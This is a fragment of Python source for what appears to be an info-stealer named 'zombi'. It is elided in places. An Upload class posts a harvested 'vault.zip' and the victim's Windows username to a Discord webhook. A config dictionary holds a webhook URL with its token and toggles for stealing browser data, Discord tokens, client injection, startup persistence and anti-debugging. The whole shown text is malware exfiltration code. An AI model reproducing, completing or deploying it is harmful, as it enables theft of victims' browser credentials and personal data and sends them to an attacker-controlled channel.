...
class Upload:
    ...
    def send(self):
        ...
        self.webhook.send(
            f"# zombi has spread to {windows_username}",
            embed=Embed(
                title="Vault",
                description="```" +
            ...
            file=File("vault.zip"),
            username="zombi",
            avatar_url="https://files.catbox.moe/fvg9zn.png"
        )
...
__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1208571086955094106/c2JZvUM4HaZbEQn8hqNMe1t4BCus7zEd4l8url3zA2eU-wzSrUswk96W-YWwy0r5SoVr', 'antidebug': False, 'browsers': True, 'discordtoken': False, 'injection': False, 'startup': False, 'systeminfo': False}
